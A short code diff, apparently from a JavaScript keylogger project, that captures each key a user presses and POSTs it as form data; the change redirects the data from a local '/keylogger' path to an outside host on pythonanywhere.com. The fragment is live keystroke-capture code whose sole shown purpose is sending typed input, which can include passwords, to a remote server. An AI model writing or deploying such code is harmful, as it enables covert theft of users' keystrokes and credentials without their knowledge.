@@ -13,8 +13,8 @@
 
         formData.append("keylog", event.key);
 
-      // Grab content from form
-      fetch("/keylogger", {
+      // fetch("/keylogger", {
+      fetch("Davidqn.pythonanywhere.com/keylogger", {
         method: "POST",
         body: formData
       })
